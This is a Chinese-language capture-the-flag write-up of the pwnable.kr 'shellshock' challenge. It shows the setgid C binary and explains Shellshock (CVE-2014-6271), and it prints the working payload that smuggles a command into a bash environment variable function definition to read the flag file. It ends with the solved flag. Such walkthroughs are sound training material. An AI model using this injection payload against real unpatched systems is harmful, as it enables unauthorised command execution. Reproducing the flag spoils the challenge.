# shellshock - 1pt

## 问题描述
Mommy, there was a shocking news about bash.
I bet you already know, but lets just make it sure :)


ssh shellshock@pwnable.kr -p2222 (pw:guest)

## 源码分析

```c
#include <stdio.h>
int main(){
	setresuid(getegid(), getegid(), getegid());
	setresgid(getegid(), getegid(), getegid());
	system("/home/shellshock/bash -c 'echo shock_me'");
	return 0;
}
```

## 解题思路

Shellshock，又称Bashdoor，是在Unix中广泛使用的Bash shell中的一个安全漏洞. 漏洞的具体分析可以查看这篇文章: [破壳（ShellShock）漏洞样本分析报告](http://www.freebuf.com/articles/system/45390.html)

shellshock与flag属于同一用户组，因此可以通过shellshock读取flag文件

文章给出的测试命令如下：
```bash
env x='() { :;}; echo vulnerable' bash -c "echo this is a test" 
```
pwnable.kr也提供了一个存在漏洞的bash
```bash
shellshock@ubuntu:~$ env x='() { :;}; echo vulnerable' /home/shellshock/bash -c "echo this is a test" 
vulnerable
this is a test
```
因此

```bash
shellshock@ubuntu:~$ env x='() { :;}; /bin/cat flag' /home/shellshock/shellshock -c "/bin/cat flag" 
only if I knew CVE-2014-6271 ten years ago..!!
Segmentation fault
```

## flag
only if I knew CVE-2014-6271 ten years ago..!!

